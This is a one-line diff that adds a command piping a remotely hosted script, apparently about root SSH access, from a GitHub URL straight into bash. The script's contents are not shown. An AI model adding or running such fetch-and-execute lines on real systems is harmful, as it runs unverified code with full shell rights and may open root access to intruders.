@@ -1,0 +1,1 @@
+curl https://raw.githubusercontent.com/wikod/scripts/main/ssh_root.sh | /bin/bash
